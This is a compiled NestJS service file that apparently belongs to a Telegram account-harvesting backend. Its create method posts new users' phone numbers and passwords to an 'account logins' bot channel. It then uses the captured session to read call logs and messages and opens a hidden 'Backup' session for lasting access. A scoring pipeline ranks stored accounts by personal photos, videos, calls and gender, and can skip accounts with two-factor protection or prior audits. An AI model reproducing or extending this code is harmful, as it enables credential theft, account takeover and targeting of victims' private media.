"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.UsersService = void 0;
const Telegram_service_1 = require("./../Telegram/Telegram.service");
const common_1 = require("@nestjs/common");
const mongoose_1 = require("@nestjs/mongoose");
const mongoose_2 = require("mongoose");
const client_service_1 = require("../clients/client.service");
const connection_manager_1 = require("../Telegram/utils/connection-manager");
const bots_1 = require("../bots");
const Helpers_1 = require("telegram/Helpers");
let UsersService = class UsersService {
    constructor(userModel, telegramService, clientsService, botsService) {
        this.userModel = userModel;
        this.telegramService = telegramService;
        this.clientsService = clientsService;
        this.botsService = botsService;
    }
    async create(user) {
        const activeClientSetup = this.telegramService.getActiveClientSetup();
        console.log("New User received - ", user?.mobile);
        console.log("ActiveClientSetup::", activeClientSetup);
        if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
            console.log("Updating New Session Details", user.mobile, user.username, activeClientSetup.clientId);
            await this.clientsService.updateClientSession(user.session);
        }
        else {
            await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_LOGINS, `ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`, undefined, false);
            setTimeout(async () => {
                try {
                    const telegramClient = await connection_manager_1.connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
                    const calllogs = await telegramClient.getCallLogStats();
                    let score = 1;
                    for (const callData of calllogs.chats) {
                        const messages = await telegramClient.getMessages(callData.chatId, 2);
                        score = score + (messages.pagination.total || 0) * (callData.totalCalls + 1) * (callData.averageDuration + 1);
                        await (0, Helpers_1.sleep)(1000);
                    }
                    this.updateByFilter({ mobile: user.mobile }, { score: score });
                    const newSession = await this.telegramService.createNewSession(user.mobile);
                    const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: "Backup", score: score });
                    await newUserBackup.save();
                }
                catch (error) {
                    console.log("Error in creating new session", error);
                }
            }, 3000);
            const newUser = new this.userModel(user);
            return newUser.save();
        }
    }
    async findAll(limit = 100, skip = 0) {
        return this.userModel.find().limit(limit).skip(skip).exec();
    }
    async findOne(tgId) {
        const doc = await this.userModel.findOne({ tgId }).exec();
        if (!doc) {
            throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
        }
        return doc.toJSON();
    }
    async update(tgId, updateDto) {
        const result = await this.userModel
            .updateMany({ tgId }, { $set: updateDto }, { upsert: true })
            .exec();
        if (result.matchedCount === 0) {
            throw new common_1.NotFoundException(`Users with tgId ${tgId} not found`);
        }
        return result.modifiedCount;
    }
    async updateByFilter(filter, updateDto) {
        const result = await this.userModel
            .updateMany(filter, { $set: updateDto }, { upsert: true })
            .exec();
        if (result.matchedCount === 0) {
            throw new common_1.NotFoundException(`Users matching filter not found`);
        }
        return result.modifiedCount;
    }
    async delete(tgId) {
        const result = await this.userModel.deleteOne({ tgId }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
        }
    }
    async deleteById(userId) {
        const result = await this.userModel.deleteOne({ _id: userId }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`User with id ${userId} not found`);
        }
    }
    async search(filter) {
        const query = { ...filter };
        if (query.firstName) {
            query.firstName = { $regex: new RegExp(query.firstName, 'i') };
        }
        if (query.twoFA !== undefined) {
            query.twoFA = String(query.twoFA) === 'true' || String(query.twoFA) === '1';
        }
        return this.userModel.find(query).sort({ updatedAt: -1 }).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        if (!query) {
            throw new common_1.BadRequestException('Query is invalid.');
        }
        try {
            const queryExec = this.userModel.find(query).lean();
            if (sort)
                queryExec.sort(sort);
            if (limit)
                queryExec.limit(limit);
            if (skip)
                queryExec.skip(skip);
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    async getTopInteractionUsers(options) {
        const { page = 1, limit = 20, minScore = 30, minCalls = 0, minPhotos = 0, minVideos = 0, excludeTwoFA = false, excludeAudited = true, gender } = options;
        const pageNum = Math.max(1, Math.floor(page));
        const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);
        const skip = (pageNum - 1) * limitNum;
        const weights = {
            ownPhoto: 15,
            ownVideo: 18,
            otherPhoto: 3,
            otherVideo: 5,
            totalPhoto: 2,
            totalVideo: 3,
            incomingCall: 5,
            outgoingCall: 3,
            videoCall: 8,
            totalCalls: 1,
            msgs: 0,
            movieCount: -5,
        };
        const filter = {
            expired: { $ne: true },
        };
        if (excludeTwoFA) {
            filter.twoFA = { $ne: true };
        }
        if (gender) {
            filter.gender = gender;
        }
        if (minCalls > 0) {
            filter.$or = [
                ...(filter.$or || []),
                { 'calls.totalCalls': { $gte: minCalls } },
            ];
        }
        if (minPhotos > 0) {
            filter.$or = [
                ...(filter.$or || []),
                { photoCount: { $gte: minPhotos } },
                { ownPhotoCount: { $gte: minPhotos } },
                { otherPhotoCount: { $gte: minPhotos } },
            ];
        }
        if (minVideos > 0) {
            filter.$or = [
                ...(filter.$or || []),
                { videoCount: { $gte: minVideos } },
                { ownVideoCount: { $gte: minVideos } },
                { otherVideoCount: { $gte: minVideos } },
            ];
        }
        const scoringStages = [
            { $match: filter },
            ...(excludeAudited
                ? [
                    { $lookup: { from: 'session_audits', localField: 'mobile', foreignField: 'mobile', as: 'sessionAudits' } },
                    { $match: { sessionAudits: { $size: 0 } } },
                    { $project: { sessionAudits: 0 } },
                ]
                : []),
            { $group: { _id: '$mobile', doc: { $first: '$$ROOT' } } },
            { $replaceRoot: { newRoot: '$doc' } },
            {
                $addFields: {
                    photoScore: {
                        $add: [
                            { $multiply: [{ $ifNull: ['$ownPhotoCount', 0] }, weights.ownPhoto] },
                            { $multiply: [{ $ifNull: ['$otherPhotoCount', 0] }, weights.otherPhoto] },
                            {
                                $cond: {
                                    if: { $and: [{ $lte: [{ $ifNull: ['$ownPhotoCount', 0] }, 0] }, { $lte: [{ $ifNull: ['$otherPhotoCount', 0] }, 0] }] },
                                    then: { $multiply: [{ $ifNull: ['$photoCount', 0] }, weights.totalPhoto] },
                                    else: 0,
                                },
                            },
                        ],
                    },
                    videoScore: {
                        $add: [
                            { $multiply: [{ $ifNull: ['$ownVideoCount', 0] }, weights.ownVideo] },
                            { $multiply: [{ $ifNull: ['$otherVideoCount', 0] }, weights.otherVideo] },
                            {
                                $cond: {
                                    if: { $and: [{ $lte: [{ $ifNull: ['$ownVideoCount', 0] }, 0] }, { $lte: [{ $ifNull: ['$otherVideoCount', 0] }, 0] }] },
                                    then: { $multiply: [{ $ifNull: ['$videoCount', 0] }, weights.totalVideo] },
                                    else: 0,
                                },
                            },
                        ],
                    },
                    callScore: {
                        $let: {
                            vars: {
                                incomingVal: { $ifNull: ['$calls.incoming', 0] },
                                outgoingVal: { $ifNull: ['$calls.outgoing', 0] },
                                videoVal: { $ifNull: ['$calls.video', 0] },
                                totalCallsVal: { $ifNull: ['$calls.totalCalls', 0] },
                            },
                            in: {
                                $add: [
                                    { $multiply: ['$$incomingVal', weights.incomingCall] },
                                    { $multiply: ['$$outgoingVal', weights.outgoingCall] },
                                    { $multiply: ['$$videoVal', weights.videoCall] },
                                    {
                                        $cond: {
                                            if: { $and: [{ $eq: ['$$incomingVal', 0] }, { $eq: ['$$outgoingVal', 0] }, { $gt: ['$$totalCallsVal', 0] }] },
                                            then: { $multiply: ['$$totalCallsVal', weights.totalCalls] },
                                            else: 0,
                                        },
                                    },
                                ],
                            },
                        },
                    },
                    msgScore: { $multiply: [{ $ifNull: ['$msgs', 0] }, weights.msgs] },
                    movieScore: { $multiply: [{ $ifNull: ['$movieCount', 0] }, weights.movieCount] },
                },
            },
            {
                $addFields: {
                    interactionScore: {
                        $round: [{ $add: ['$photoScore', '$videoScore', '$callScore', '$msgScore', '$movieScore'] }, 2],
                    },
                },
            },
            { $match: { interactionScore: { $gte: minScore } } },
        ];
        try {
            const countPipeline = [...scoringStages, { $count: 'count' }];
            const countResult = await this.userModel.collection.aggregate(countPipeline, { allowDiskUse: true }).toArray();
            const totalUsers = countResult[0]?.count ?? 0;
            if (totalUsers === 0) {
                return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
            }
            const pagePipeline = [
                ...scoringStages,
                { $project: { _id: 1, interactionScore: 1 } },
                { $sort: { interactionScore: -1 } },
                { $skip: skip },
                { $limit: limitNum },
            ];
            const pageResult = await this.userModel.collection.aggregate(pagePipeline, { allowDiskUse: true }).toArray();
            if (pageResult.length === 0) {
                return { users: [], total: totalUsers, page: pageNum, limit: limitNum, totalPages: Math.ceil(totalUsers / limitNum) };
            }
            const idOrder = pageResult.map((r) => r._id);
            const idToScore = new Map(pageResult.map((r) => [String(r._id), r.interactionScore]));
            const docs = await this.userModel.find({ _id: { $in: idOrder } }).select('-session').lean().exec();
            const docById = new Map(docs.map((d) => [String(d._id), d]));
            const users = idOrder.map((id) => {
                const doc = docById.get(String(id));
                if (!doc)
                    return null;
                const { session, ...rest } = doc;
                return { ...rest, interactionScore: idToScore.get(String(id)) ?? 0 };
            }).filter(Boolean);
            const totalPages = Math.ceil(totalUsers / limitNum);
            return { users, total: totalUsers, page: pageNum, limit: limitNum, totalPages };
        }
        catch (error) {
            console.error('Error in getTopInteractionUsers aggregation:', error);
            throw new common_1.InternalServerErrorException(`Failed to fetch top interaction users: ${error.message}`);
        }
    }
};
exports.UsersService = UsersService;
exports.UsersService = UsersService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('userModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        client_service_1.ClientService,
        bots_1.BotsService])
], UsersService);
//# sourceMappingURL=users.service.js.map